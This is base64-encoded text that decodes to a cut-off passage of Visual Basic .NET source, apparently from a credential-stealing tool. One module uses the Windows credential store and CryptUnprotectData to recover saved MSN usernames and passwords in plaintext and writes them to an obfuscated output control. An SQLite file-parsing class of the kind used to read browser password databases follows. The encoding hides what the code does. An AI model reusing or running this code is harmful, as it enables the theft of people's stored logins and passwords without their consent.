SW50UHRyLlplcm8NCiAgICBQdWJsaWMgZGF0YUluIEFzIERBVEFfQkxPQg0KICAgIFB1YmxpYyBk YXRhT3V0IEFzIERBVEFfQkxPQg0KICAgIFB1YmxpYyB1RGV0YWlsIEFzIFVzZXJEZXRhaWxzDQog ICAgUHVibGljIEZ1bmN0aW9uIGdldFB3ZCgpIEFzIFN0cmluZygpDQogICAgICAgIFBhc3N3b3Jk KCkNCiAgICAgICAgRGltIHBhc3MgQXMgU3RyaW5nKCkgPSB7dURldGFpbC51TmFtZSwgdURldGFp bC51UGFzc30NCiAgICAgICAgUmV0dXJuIHBhc3MNCg0KICAgIEVuZCBGdW5jdGlvbg0KICAgIFB1 YmxpYyBTdWIgUGFzc3dvcmQoKQ0KICAgICAgICBUcnkNCiAgICAgICAgICAgIERpbSBwdHIgQXMg SW50UHRyID0gTWFyc2hhbC5SZWFkSW50UHRyKHBDcmVkZW50aWFscywgMCAqIDQpDQogICAgICAg ICAgICBDcmVkID0gQ1R5cGUoTWFyc2hhbC5QdHJUb1N0cnVjdHVyZShwdHIsIENyZWQuW0dldFR5 cGVdKCkpLCBDUkVERU5USUFMKQ0KICAgICAgICAgICAgZGF0YUluLnBiRGF0YSA9IENyZWQuQ3Jl ZGVudGlhbEJsb2INCiAgICAgICAgICAgIGRhdGFJbi5jYkRhdGEgPSBDcmVkLkNyZWRlbnRpYWxC bG9iU2l6ZQ0KICAgICAgICAgICAgQ3J5cHRVbnByb3RlY3REYXRhKGRhdGFJbiwgMCwgMCwgMCwg MCwgMSwgXw0KICAgICAgICAgICAgIGRhdGFPdXQpDQogICAgICAgICAgICBkYXRhT3V0LnBiRGF0 YSA9IGRhdGFJbi5wYkRhdGENCg0KICAgICAgICAgICAgdURldGFpbC51TmFtZSA9IENyZWQuVXNl ck5hbWUNCiAgICAgICAgICAgIHVEZXRhaWwudVBhc3MgPSAoTWFyc2hhbC5QdHJUb1N0cmluZ1Vu aShOZXcgSW50UHRyKGRhdGFPdXQucGJEYXRhKSkpDQogICAgICAgICAgICBEaW0gbmwgQXMgU3Ry aW5nID0gdmJOZXdMaW5lDQogICAgICAgICAgICBbMjRdLls4OF0uQXBwZW5kVGV4dChubCkNCiAg ICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KCJ+fn5+fk1TTn5+fn5+IikNCiAgICAgICAg ICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0KG5sKQ0KICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVu ZFRleHQoIlVzZXJuYW1lOiAiICYgdURldGFpbC51TmFtZSkNCiAgICAgICAgICAgIFsyNF0uWzg4 XS5BcHBlbmRUZXh0KG5sKQ0KICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQoIlBhc3N3 b3JkOiAiICYgdURldGFpbC51UGFzcykNCiAgICAgICAgICAgIFsyNF0uWzg4XS5BcHBlbmRUZXh0 KG5sKQ0KICAgICAgICAgICAgWzI0XS5bODhdLkFwcGVuZFRleHQoIn5+fn5+fn5+fn4iKQ0KICAg ICAgICAgICAgRXhpdCBTdWINCiAgICAgICAgQ2F0Y2ggeCBBcyBFeGNlcHRpb24NCg0KICAgICAg ICAgICAgRXhpdCBTdWINCiAgICAgICAgRW5kIFRyeQ0KICAgIEVuZCBTdWINCkVuZCBNb2R1bGUN Cg0KDQoNClB1YmxpYyBDbGFzcyBTUUxpdGVIYW5kbGVyDQogICAgUHJpdmF0ZSBkYl9ieXRlcygp IEFzIEJ5dGUNCiAgICBQcml2YXRlIHBhZ2Vfc2l6ZSBBcyBVSW50MTYNCiAgICBQcml2YXRlIGVu Y29kaW5nIEFzIFVJbnQ2NA0KICAgIFByaXZhdGUgbWFzdGVyX3RhYmxlX2VudHJpZXMoKSBBcyBz cWxpdGVfbWFzdGVyX2VudHJ5DQoNCiAgICBQcml2YXRlIFNRTERhdGFUeXBlU2l6ZSgpIEFzIEJ5 dGUgPSBOZXcgQnl0ZSgpIHswLCAxLCAyLCAzLCA0LCA2LCA4LCA4LCAwLCAwfQ0KICAgIFByaXZh dGUgdGFibGVfZW50cmllcygpIEFzIHRhYmxlX2VudHJ5DQogICAgUHJpdmF0ZSBmaWVsZF9uYW1l cygpIEFzIFN0cmluZw0KDQogICAgUHJpdmF0ZSBTdHJ1Y3R1cmUgcmVjb3JkX2hlYWRlcl9maWVs ZA0KICAgICAgICBEaW0gc2l6ZSBBcyBJbnQ2NA0KICAgICAgICBEaW0gdHlwZSBBcyBJbnQ2NA0K ICAgIEVuZCBTdHJ1Y3R1cmUNCg0KICAgIFByaXZhdGUgU3RydWN0dXJlIHRhYmxlX2VudHJ5DQog ICAgICAgIERpbSByb3dfaWQgQXMgSW50NjQNCiAgICAgICAgRGltIGNvbnRlbnQoKSBBcyBTdHJp bmcNCiAgICBFbmQgU3RydWN0dXJlDQoNCiAgICBQcml2YXRlIFN0cnVjdHVyZSBzcWxpdGVfbWFz dGVyX2VudHJ5DQogICAgICAgIERpbSByb3dfaWQgQXMgSW50NjQNCiAgICAgICAgRGltIGl0ZW1f dHlwZSBBcyBTdHJpbmcNCiAgICAgICAgRGltIGl0ZW1fbmFtZSBBcyBTdHJpbmcNCiAgICAgICAg RGltIGFzdGFibGVfbmFtZSBBcyBTdHJpbmcNCiAgICAgICAgRGltIHJvb3RfbnVtIEFzIEludDY0 DQogICAgICAgIERpbSBzcWxfc3RhdGVtZW50IEFzIFN0cmluZw0KICAgIEVuZCBTdHJ1Y3R1cmUN Cg0KICAgIFByaXZhdGUgRnVuY3Rpb24gR1ZMKEJ5VmFsIHN0YXJ0SW5kZXggQXMgSW50ZWdlcikg QXMgSW50ZWdlcg0KICAgICAgICBJZiBzdGFydEluZGV4ID4gZGJfYnl0ZXMuTGVuZ3RoIFRoZW4g UmV0dXJuIE5vdGhpbmcNCg0KICAgICAgICBGb3IgaSBhcyBpbnRlZ2VyID0gc3RhcnRJbmRleCBU byBzdGFydEluZGV4ICsgOCBTdGVwIDENCiAgICAgICAgICAgIElmIGkgPiBkYl9ieXRlcy5MZW5n dGggLSAxIFRoZW4NCiAgICAgICAgICAgICAgICBSZXR1cm4gTm90aGluZw0KICAgICAgICAgICAg RWxzZUlmIChkYl9ieXRlcyhpKSBBbmQgJkg4MCkgPD4gJkg4MCBUaGVuDQogICAgICAgICAgICAg ICAgUmV0dXJuIGkNCiAgICAgICAgICAgIEVuZCBJZg0KICAgICAgICBOZXh0DQoNCiAgICAgICAg UmV0dXJuIHN0YXJ0SW5kZXggKyA4DQogICAgRW5kIEZ1bmN0aW9uDQoNCiAgICBQcml2YXRlIEZ1 bmN0aW9uIENWTChCeVZhbCBzdGFydEluZGV4IEFzIEludGVnZXIsIEJ5VmFsIGVuZEluZGV4IEFz IEludGVnZXIpIEFzIEludDY0DQogICAgICAgIGVuZEluZGV4ID0gZW5kSW5kZXggKyAxDQoNCiAg ICAgICAgRGltIHJldHVzKDcpIEFzIEJ5dGUNCiAgICAgICAgRGltIExlbmd0aCA9IGVuZEluZGV4 IC0gc3RhcnRJbmRleA0KICAgICAgICBEaW0gQml0NjQgQXMgQm9vbGVhbiA9IEZhbHNlDQoNCiAg ICAgICAgSWYgTGVuZ3RoID0gMCBPciBMZW5ndGggPiA5IFRoZW4gUmV0dXJuIE5vdGhpbmcNCiAg ICAgICAgSWYgTGVuZ3RoID0gMSBUaGVuDQogICAgICAgICAgICByZXR1cygwKSA9IChkYl9ieXRl cyhzdGFydEluZGV4KSBBbmQgJkg3RikNCiAgICAgICAgICAgIFJldHVybiBCaXRDb252ZXJ0ZXIu VG9JbnQ2NChyZXR1cywgMCkNCiAgICAgICAgRW5kIElmDQoNCiAgICAgICAgSWYgTGVuZ3RoID0g OSBUaGVuDQogICAgICAgICAgICANCiAgICAgICAgICAgIEJpdDY0ID0gVHJ1ZQ0KICAgICAgICBF bmQgSWYNCg0KICAgICAgICBEaW0gaiBBcyBJbnRlZ2VyID0gMQ0KICAgICAgICBEaW0gayBBcyBJ bnRlZ2VyID0gNw0KICAgICAgICBEaW0geSBBcyBJbnRlZ2VyID0gMA0KDQogICAgICAgIElmIEJp dDY0IFRoZW4NCiAgICAgICAgICAgIHJldHVzKDApID0gZGJfYnl0ZXMoZW5kSW5kZXggLSAxKQ0K ICAgICAgICAgICAgZW5kSW5kZXggPSBlbmRJbmRleCAtIDENCiAgICAgICAgICAgIHkgPSAxDQog ICAgICAgIEVuZCBJZg0KDQogICAgICAgIEZvciBpIGFzIGludGVnZXIgPSAoZW5kSW5kZXggLSAx KSBUbyBzdGFydEluZGV4IFN0ZXAgLTENCiAgICAgICAgICAgIElmIChpIC0gMSkgPj0gc3RhcnRJ bmRleCBUaGVuDQogICAgICAgICAgICAgICAgcmV0dXMoeSkgPSAoKGRiX2J5dGVzKGkpID4+IChq IC0gMSkpIEFuZCAoJkhGRiA+PiBqKSkgT3IgKGRiX2J5dGVzKGkgLSAxKSA8PCBrKQ0KICAgICAg ICAgICAgICAgIGogPSBqICsgMQ0KICAgICAgICAgICAgICAgIHkgPSB5ICsgMQ0KICAgICAgICAg ICAgICAgIGsgPSBrIC0gMQ0KICAgICAgICAgICAgRWxzZQ0KICAgICAgICAgICAgICAgIElmIE5v dCBCaXQ2NCBUaGVuIHJldHVzKHkpID0gKChkYl9ieXRlcyhpKSA+PiAoaiAtIDEpKSBBbmQgKCZI RkYgPj4gaikpDQogICAgICAgICAgICBFbmQgSWYNCiAgICAgICAgTmV4dA0KDQogICAgICAgIFJl dHVybiBCaXRDb252ZXJ0ZXIuVG9JbnQ2NChyZXR1cywgMCkNCiAgICBFbmQgRnVuY3Rpb24NCg0K DQogICAgUHJpdmF0ZSBGdW5jdGlvbiBJc09kZChCeVZhbCB2YWx1ZSBBcyBJbnQ2NCkgQXMgQm9v bGVhbg0KICAgICAgICBSZXR1cm4gKHZhbHVlIEFuZCAxKSA9IDENCiAgICBFbmQgRnVuY3Rpb24N Cg0KDQogICAgUHJpdmF0ZSBGdW5jdGlvbiBDb252ZXJ0VG9JbnRlZ2VyKEJ5VmFsIHN0YXJ0SW5k ZXggQXMgSW50ZWdlciwgQnlWYWwgU2l6ZSBBcyBJbnRlZ2VyKSBBcyBVSW50NjQNCiAgICAgICAg SWYgU2l6ZSA+IDggT3IgU2l6ZSA9IDAgVGhlbiBSZXR1cm4gTm90aGluZw0KDQogICAgICAgIERp bSByZXRWYWwgQXMgVUludDY0ID0gMA0KDQogICAgICAgIEZvciBpIGFzIGludGVnZXIgPSAwIFRv IFNpemUgLSAxIFN0ZXAgMQ0KICAgICAgICAgICAgcmV0VmFsID0gKChyZXRWYWwgPDwgOCkgT3Ig ZGJfYnl0ZXMoc3RhcnRJbmRleCArIGkpKQ0KICAgICAgICBOZXh0DQoNCiAgICAgICAgUmV0dXJu IHJldFZhbA0KICAgIEVuZCBGdW5jdGlvbg0KDQogICAgUHJpdmF0ZSBTdWIgUmVhZE1hc3RlclRh YmxlKEJ5VmFsIE9mZnNldCBBcyBVSW50NjQpDQoNCiAgICAgICAgSWYgZGJfYnl0ZXMoT2Zmc2V0 KSA9ICZIRCBUaGVuICdMZWFmIG5vZGUNCiAgICAgICAgICAgICdMZW5ndGggZm9yIHNldHRpbmcg dGhlIGFycmF5IGxlbmd0aCBmb3IgdGhlIGVudHJpZXMNCiAgICAgICAgICAgIERpbSBMZW5ndGgg QXMgVUludDE2ID0gQ29udmVydFRvSW50ZWdlcihPZmZzZXQgKyAzLCAyKSAtIDENCiAgICAgICAg ICAgIERpbSBvbCBBcyBJbnRlZ2VyID0gMA0KDQogICAgICAgICAgICBJZiBOb3QgbWFzdGVyX3Rh YmxlX2VudHJpZXMgSXMgTm90aGluZyBUaGVuDQogICAgICAgICAgICAgICAgb2wgPSBtYXN0ZXJf dGFibGVfZW50cmllcy5MZW5ndGgNCiAgICAgICAgICAgICAgICBSZURpbSBQcmVzZXJ2ZSBtYXN0 ZXJfdGFibGVfZW50cmllcyhtYXN0ZXJfdGFibGVfZW50cmllcy5MZW5ndGggKyBMZW5ndGgpDQog ICAgICAgICAgICBFbHNlDQogICAgICAgICAgICAgICAgUmVEaW0gbWFzdGVyX3RhYmxlX2VudHJp ZXMoTGVuZ3RoKQ0KICAgICAgICAgICAgRW5kIElmDQoNCiAgICAgICAgICAgIERpbSBlbnRfb2Zm c2V0IEFzIFVJbnQ2NA0KDQogICAgICAgICAgICBGb3IgaSBhcyBpbnRlZ2VyID0gMCBUbyBMZW5n dGggU3RlcCAxDQogICAgICAgICAgICAgICAgZW50X29mZnNldCA9IENvbnZlcnRUb0ludGVnZXIo T2Zmc2V0ICsgOCArIChpICogMiksIDIpDQoNCiAgICAgICAgICAgICAgICBJZiBPZmZzZXQgPD4g MTAwIFRoZW4gZW50X29mZnNldCA9IGVudF9vZmZzZXQgKyBPZmZzZXQNCg0KDQogICAgICAgICAg ICAgICAgRGltIHQgPSBHVkwoZW50X29mZnNldCkNCiAgICAgICAgICAgICAgICBEaW0gc2l6ZSBB cyBJbnQ2NCA9IENWTChlbnRfb2Zmc2V0LCB0KQ0KDQogICAgICAgICAgICAgICAgRGltIHMgPSBH VkwoZW50X29mZnNldCArICh0IC0gZW50X29mZnNldCkgKyAxKQ0KICAgICAgICAgICAgICAgIG1h c3Rlcl90YWJsZV9lbnRyaWVzKG9sICsgaSkucm93X2lkID0gQ1ZMKGVudF9vZmZzZXQgKyAodCAt IGVudF9vZmZzZXQpICsgMSwgcykNCg0KDQogICAgICAgICAgICAgICAgZW50X29mZnNldCA9IGVu dF9vZmZzZXQgKyAocyAtIGVudF9vZmZzZXQpICsgMQ0KDQoNCiAgICAgICAgICAgICAgICB0ID0g R1ZMKGVudF9vZmZzZXQpDQogICAgICAgICAgICAgICAgcyA9IHQNCiAgICAgICAgICAgICAgICBE aW0gUmVjX0hlYWRlcl9TaXplIEFzIEludDY0ID0gQ1ZMKGVudF9vZmZzZXQsIHQpICdSZWNvcmQg SGVhZGVyIExlbmd0aA0KDQogICAgICAgICAgICAgICAgRGltIEZpZWxkX1NpemUoNCkgQXMgSW50 NjQNCg0KDQogICAgICAgICAgICAgICAgRm9yIGogYXMgaW50ZWdlciA9IDAgVG8gNCBTdGVwIDEN CiAgICAgICAgICAgICAgICAgICAgdCA9IHMgKyAxDQogICAgICAgICAgICAgICAgICAgIHMgPSBH VkwodCkNCiAgICAgICAgICAgICAgICAgICAgRmllbGRfU2l6ZShqKSA9IENWTCh0LCBzKQ0KDQog ICAgICAgICAgICAgICAgICAgIElmIEZpZWxkX1NpemUoaikgPiA5IFRoZW4NCiAgICAgICAgICAg ICAgICAgICAgICAgIElmIElzT2RkKEZpZWxkX1NpemUoaikpIFRoZW4NCiAgICAgICAgICAgICAg ICAgICAgICAgICAgICBGaWVsZF9TaXplKGopID0gKEZpZWxkX1NpemUoaikgLSAxMykgLyAyDQog ICAgICAgICAgICAgICAgICAgICAgICBFbHNlDQogICAgICAgICAgICAgICAgICAgICAgICAgICAg RmllbGRfU2l6ZShqKSA9IChGaWVsZF9TaXplKGopIC0gMTIpIC8gMg0KICAgICAgICAgICAgICAg ICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgICAgIEVsc2UNCiAgICAgICAgICAgICAg ICAgICAgICAgIEZpZWxkX1NpemUoaikgPSBTUUxEYXRhVHlwZVNpemUoRmllbGRfU2l6ZShqKSkN CiAgICAgICAgICAgICAgICAgICAgRW5kIElmDQogICAgICAgICAgICAgICAgTmV4dA0KDQoNCiAg ICAgICAgICAgICAgICBJZiBlbmNvZGluZyA9IDEgVGhlbg0KICAgICAgICAgICAgICAgICAgICBt YXN0ZXJfdGFibGVfZW50cmllcyhvbCArIGkpLml0ZW1fdHlwZSA9IFN5c3RlbS5UZXh0LkVuY29k aW5nLkRlZmF1bHQuR2V0U3RyaW5nKGRiX2J5dGVzLCBlbnRfb2Zmc2V0ICsgUmVjX0hlYWRlcl9T aXplLCBGaWVsZF9TaXplKDApKQ0KICAgICAgICAgICAgICAgIEVsc2VJZiBlbmNvZGluZyA9IDIg VGhlbg0KICAgICAgICAgICAgICAgICAgICBtYXN0ZXJfdGFibGVfZW50cmllcyhvbCArIGkpLml0 ZW1fdHlwZSA9IFN5c3RlbS5UZXh0LkVuY29kaW5nLlVuaWNvZGUuR2V0U3RyaW5nKGRiX2J5dGVz LCBlbnRfb2Zmc2V0ICsgUmVjX0hlYWRlcl9TaXplLCBGaWVsZF9TaXplKDApKQ0KICAgICAgICAg ICAgICAgIEVsc2VJZiBlbmNvZGluZyA9IDMgVGhlbg0KICAgICAgICAgICAgICAgICAgICBtYXN0 ZXJfdGFibGVfZW50cmllcyhvbCArIGkpLml0ZW1fdHlwZSA9IFN5c3RlbS5UZXh0LkVuY29kaW5n LkJpZ0VuZGlhblVuaWNvZGUuR2V0U3RyaW5nKGRiX2J5dGVzLCBlbnRfb2Zmc2V0ICsgUmVjX0hl YWRlcl9TaXplLCBGaWVsZF9TaXplKDApKQ0KICAgICAgICAgICAgICAgIEVuZCBJZg0KICAgICAg ICAgICAgICAgIElmIGVuY29kaW5nID0gMSBUaGVuDQogICAgICAgICAgICAgICAgICAgIG1hc3Rl cl90YWJsZV9lbnRyaWVzKG9sICsgaSkuaXRlbV9uYW1lID0gU3lzdGVtLlRleHQuRW5jb2Rpbmcu RGVmYXVsdC5HZXRTdHJpbmcoZGJfYnl0ZXMsIGVudF9vZmZzZXQgKyBSZWNfSGVhZGVyX1NpemUg KyBGaWVsZF9TaXplKDApLCBGaWVsZF9TaXplKDEpKQ0KICAgICAgICAgICAgICAgIEVsc2VJZiBl bmNvZGluZyA9IDIgVGhlbg0KICAgICAgICAgICAgICAgICAgICBtYXN0ZXJfdGFibGVfZW50cmll cyhvbCArIGkpLml0ZW1fbmFtZSA9IFN5c3RlbS5UZXh0LkVuY29kaW5nLlVuaWNvZGUuR2V0U3Ry aW5nKGRiX2J5dGVzLCBlbnRfb2Zmc2V0ICsgUmVjX0hlYWRlcl9TaXplICsgRmllbGRfU2l6ZSgw KSwgRmllbGRfU2l6ZSgxKSkNCiAgICAgICAgICAgICAgICBFbHNlSWYgZW5jb2RpbmcgPSAzIFRo ZW4NCiAgICAgICAgICAgICAgICAgICAgbWFzdGVyX3RhYmxlX2VudHJpZXMob2wgKyBpKS5pdGVt X25hbWUgPSBTeXN0ZW0uVGV4dC5FbmNvZGluZy5CaWdFbmRpYW5Vbmljb2RlLkdldFN0cmluZyhk Yl9ieXRlcywgZW50X29mZnNldCArIFJlY19IZWFkZXJfU2l6ZSArIEZpZWxkX1NpemUoMCksIEZp ZWxkX1NpemUoMSkpDQogICAgICAgICAgICAgICAgRW5kIElmDQoNCiAgICAgICAgICAgICAgICBt YXN0ZXJfdGFibGVfZW50cmllcyhvbCArIGkpLnJvb3RfbnVtID0gQ29udmVydFRvSW50ZWdlcihl bnRfb2Zmc2V0ICsgUmVjX0hlYWRlcl9TaXplICsgRmllbGRfU2l6ZSgwKSArIEZpZWxkX1NpemUo MSkgKyBGaWVsZF9TaXplKDIpLCBGaWVsZF9TaXplKDMpKQ0KICAgICAgICAgICAgICAgIElmIGVu Y29kaW5nID0gMSBUaGVuDQogICAgICAgICAgICAgICAgICAgIG1hc3Rlcl90YWJsZV9lbnRyaWVz KG9sICsgaSkuc3FsX3N0YXRlbWVudCA9IFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0 U3RyaW5nKGRiX2J5dGVzLCBlbnRfb2Zmc2V0ICsgUmVjX0hlYWRlcl9TaXplICsgRmllbGRfU2l6 ZSgwKSArIEZpZWxkX1NpemUoMSkgKyBGaWVsZF9TaXplKDIpICsgRmllbGRfU2l6ZSgzKSwgRmll bGRfU2l6ZSg0KSkNCiAgICAgICAgICAgICAgICBFbHNlSWYgZW5jb2RpbmcgPSAyIFRoZW4NCiAg ICAgICAgICAgICAgICAgICAgbWFzdGVyX3RhYmxlX2VudHJpZXMob2wgKyBpKS5zcWxfc3RhdGVt ZW50ID0gU3lzdGVtLlRleHQuRW5jb2RpbmcuVW5pY29kZS5HZXRTdHJpbmcoZGJfYnl0ZXMsIGVu dF9vZmZzZXQgKyBSZWNfSGVhZGVyX1NpemUgKyBGaWVsZF9TaXplKDApICsgRmllbGRfU2l6ZSgx KSArIEZpZWxkX1NpemUoMikgKyBGaWVsZF9TaXplKDMpLCBGaWVsZF9TaXplKDQpKQ0KICAgICAg ICAgICAgICAgIEVsc2VJZiBlbmNvZGluZyA9IDMgVGhlbg0KICAgICAgICAgICAgICAgICAgICBt YXN0ZXJfdGFibGVfZW50cmllcyhvbCArIGkpLnNxbF9zdGF0ZW1lbnQgPSBTeXN0ZW0uVGV4dC5F bmNvZGluZy5CaWdFbmRpYW5Vbmljb2RlLkdldFN0cmluZyhkYl9ieXRlcywgZW50X29mZnNldCAr IFJlY19IZWFkZXJfU2l6ZSArIEZpZWxkX1NpemUoMCkgKyBGaWVsZF9TaXplKDEpICsgRmllbGRf U2l6ZSgyKSArIEZpZWxkX1NpemUoMyksIEZpZWxkX1NpemUoNCkpDQogICAgICAgICAgICAgICAg RW5kIElmDQogICAgICAgICAgICBOZXh0DQogICAgICAgIEVsc2VJZiBkYl9ieXRlcyhPZmZzZXQp ID0gJkg1IFRoZW4NCiAgICAgICAgICAgIERpbSBMZW5ndGggQXMgVUludDE2ID0gQ29udmVydFRv SW50ZWdlcihPZmZzZXQgKyAzLCAyKSAtIDENCiAgICAgICAgICAgIERpbSBlbnRfb2Zmc2V0IEFz IFVJbnQxNg0KDQogICAgICAgICAgICBGb3IgaSBhcyBpbnRlZ2VyID0gMCBUbyBMZW5ndGggU3Rl cCAxDQogICAgICAgICAgICAgICAgZW50X29mZnNldCA9IENvbnZlcnRUb0ludGVnZXIoT2Zmc2V0 ICsgMTIgKyAoaSAqIDIpLCAyKQ0KDQogICAgICAgICAgICAgICAgSWYgT2Zmc2V0ID0gMTAwIFRo ZW4NCiAgICAgICAgICAgICAgICAgICAgUmVhZE1hc3RlclRhYmxlKChDb252ZXJ0VG9JbnRlZ2Vy KGVudF9vZmZzZXQsIDQpIC0gMSkgKiBwYWdlX3NpemUpDQogICAgICAgICAgICAgICAgRWxzZQ0K ICAgICAgICAgICAgICAgICAgICBSZWFkTWFzdGVyVGFibGUoKENvbnZlcnRUb0ludGVnZXIoT2Zm c2V0ICsgZW50X29mZnNldCwgNCkgLSAxKSAqIHBhZ2Vfc2l6ZSkNCiAgICAgICAgICAgICAgICBF bmQgSWYNCg0KICAgICAgICAgICAgTmV4dA0KDQogICAgICAgICAgICBSZWFkTWFzdGVyVGFibGUo KENvbnZlcnRUb0ludGVnZXIoT2Zmc2V0ICsgOCwgNCkgLSAxKSAqIHBhZ2Vfc2l6ZSkNCiAgICAg ICAgRW5kIElmDQogICAgRW5kIFN1Yg0KDQogICAgUHJpdmF0ZSBGdW5jdGlvbiBSZWFkVGFibGVG cm9tT2Zmc2V0KEJ5VmFsIE9mZnNldCBBcyBVSW50NjQpIEFzIEJvb2xlYW4NCiAgICAgICAgSWYg ZGJfYnl0ZXMoT2Zmc2V0KSA9ICZIRCBUaGVuDQoNCg0KICAgICAgICAgICAgRGltIExlbmd0aCBB cyBVSW50MTYgPSBDb252ZXJ0VG9JbnRlZ2VyKE9mZnNldCArIDMsIDIpIC0gMQ0KICAgICAgICAg ICAgRGltIG9sIEFzIEludGVnZXIgPSAwDQoNCiAgICAgICAgICAgIElmIE5vdCB0YWJsZV9lbnRy aWVzIElzIE5vdGhpbmcgVGhlbg0KICAgICAgICAgICAgICAgIG9sID0gdGFibGVfZW50cmllcy5M ZW5ndGgNCiAgICAgICAgICAgICAgICBSZURpbSBQcmVzZXJ2ZSB0YWJsZV9lbnRyaWVzKHRhYmxl X2VudHJpZXMuTGVuZ3RoICsgTGVuZ3RoKQ0KICAgICAgICAgICAgRWxzZQ0KICAgICAgICAgICAg ICAgIFJlRGltIHRhYmxlX2VudHJpZXMoTGVuZ3RoKQ0KICAgICAgICAgICAgRW5kIElmDQoNCiAg ICAgICAgICAgIERpbSBlbnRfb2Zmc2V0IEFzIFVJbnQ2NA0KDQogICAgICAgICAgICBGb3IgaSBh cyBpbnRlZ2VyID0gMCBUbyBMZW5ndGggU3RlcCAxDQogICAgICAgICAgICAgICAgZW50X29mZnNl dCA9IENvbnZlcnRUb0ludGVnZXIoT2Zmc2V0ICsgOCArIChpICogMiksIDIpDQoNCiAgICAgICAg ICAgICAgICBJZiBPZmZzZXQgPD4gMTAwIFRoZW4gZW50X29mZnNldCA9IGVudF9vZmZzZXQgKyBP ZmZzZXQNCg0KICAgICAgICAgICAgICAgICcNCiAgICAgICAgICAgICAgICBEaW0gdCA9IEdWTChl bnRfb2Zmc2V0KQ0KICAgICAgICAgICAgICAgIERpbSBzaXplIEFzIEludDY0ID0gQ1ZMKGVudF9v ZmZzZXQsIHQpDQoNCiAgICAgICAgICAgICAgICBEaW0gcyA9IEdWTChlbnRfb2Zmc2V0ICsgKHQg LSBlbnRfb2Zmc2V0KSArIDEpDQogICAgICAgICAgICAgICAgdGFibGVfZW50cmllcyhvbCArIGkp LnJvd19pZCA9IENWTChlbnRfb2Zmc2V0ICsgKHQgLSBlbnRfb2Zmc2V0KSArIDEsIHMpDQoNCg0K ICAgICAgICAgICAgICAgIGVudF9vZmZzZXQgPSBlbnRfb2Zmc2V0ICsgKHMgLSBlbnRfb2Zmc2V0 KSArIDENCg0KDQogICAgICAgICAgICAgICAgdCA9IEdWTChlbnRfb2Zmc2V0KQ0KICAgICAgICAg ICAgICAgIHMgPSB0DQogICAgICAgICAgICAgICAgRGltIFJlY19IZWFkZXJfU2l6ZSBBcyBJbnQ2 NCA9IENWTChlbnRfb2Zmc2V0LCB0KQ0KDQogICAgICAgICAgICAgICAgRGltIEZpZWxkX1NpemUo KSBBcyByZWNvcmRfaGVhZGVyX2ZpZWxkID0gbm90aGluZw0KICAgICAgICAgICAgICAgIERpbSBz aXplX3JlYWQgQXMgSW50NjQgPSAoZW50X29mZnNldCAtIHQpICsgMQ0KICAgICAgICAgICAgICAg IERpbSBqID0gMA0KDQoNCiAgICAgICAgICAgICAgICBXaGlsZSBzaXplX3JlYWQgPCBSZWNfSGVh ZGVyX1NpemUNCiAgICAgICAgICAgICAgICAgICAgUmVEaW0gUHJlc2VydmUgRmllbGRfU2l6ZShq KQ0KDQogICAgICAgICAgICAgICAgICAgIHQgPSBzICsgMQ0KICAgICAgICAgICAgICAgICAgICBz ID0gR1ZMKHQpDQogICAgICAgICAgICAgICAgICAgIEZpZWxkX1NpemUoaikudHlwZSA9IENWTCh0 LCBzKQ0KDQogICAgICAgICAgICAgICAgICAgIElmIEZpZWxkX1NpemUoaikudHlwZSA+IDkgVGhl bg0KICAgICAgICAgICAgICAgICAgICAgICAgSWYgSXNPZGQoRmllbGRfU2l6ZShqKS50eXBlKSBU aGVuDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgRmllbGRfU2l6ZShqKS5zaXplID0gKEZp ZWxkX1NpemUoaikudHlwZSAtIDEzKSAvIDINCiAgICAgICAgICAgICAgICAgICAgICAgIEVsc2UN CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBGaWVsZF9TaXplKGopLnNpemUgPSAoRmllbGRf U2l6ZShqKS50eXBlIC0gMTIpIC8gMg0KICAgICAgICAgICAgICAgICAgICAgICAgRW5kIElmDQog ICAgICAgICAgICAgICAgICAgIEVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIEZpZWxkX1Np emUoaikuc2l6ZSA9IFNRTERhdGFUeXBlU2l6ZShGaWVsZF9TaXplKGopLnR5cGUpDQogICAgICAg ICAgICAgICAgICAgIEVuZCBJZg0KDQogICAgICAgICAgICAgICAgICAgIHNpemVfcmVhZCA9IHNp emVfcmVhZCArIChzIC0gdCkgKyAxDQogICAgICAgICAgICAgICAgICAgIGogPSBqICsgMQ0KICAg ICAgICAgICAgICAgIEVuZCBXaGlsZQ0KDQogICAgICAgICAgICAgICAgUmVEaW0gdGFibGVfZW50 cmllcyhvbCArIGkpLmNvbnRlbnQoRmllbGRfU2l6ZS5MZW5ndGggLSAxKQ0KICAgICAgICAgICAg ICAgIERpbSBjb3VudGVyIEFzIEludGVnZXIgPSAwDQoNCiAgICAgICAgICAgICAgICBGb3IgayBh cyBpbnRlZ2VyID0gMCBUbyBGaWVsZF9TaXplLkxlbmd0aCAtIDEgU3RlcCAxDQogICAgICAgICAg ICAgICAgICAgIElmIEZpZWxkX1NpemUoaykudHlwZSA+IDkgVGhlbg0KICAgICAgICAgICAgICAg ICAgICAgICAgSWYgTm90IElzT2RkKEZpZWxkX1NpemUoaykudHlwZSkgVGhlbg0KICAgICAgICAg ICAgICAgICAgICAgICAgICAgIElmIGVuY29kaW5nID0gMSBUaGVuDQogICAgICAgICAgICAgICAg ICAgICAgICAgICAgICAgIHRhYmxlX2VudHJpZXMob2wgKyBpKS5jb250ZW50KGspID0gU3lzdGVt LlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRTdHJpbmcoZGJfYnl0ZXMsIGVudF9vZmZzZXQgKyBS ZWNfSGVhZGVyX1NpemUgKyBjb3VudGVyLCBGaWVsZF9TaXplKGspLnNpemUpDQogICAgICAgICAg ICAgICAgICAgICAgICAgICAgRWxzZUlmIGVuY29kaW5nID0gMiBUaGVuDQogICAgICAgICAgICAg ICAgICAgICAgICAgICAgICAgIHRhYmxlX2VudHJpZXMob2wgKyBpKS5jb250ZW50KGspID0gU3lz dGVtLlRleHQuRW5jb2RpbmcuVW5pY29kZS5HZXRTdHJpbmcoZGJfYnl0ZXMsIGVudF9vZmZzZXQg 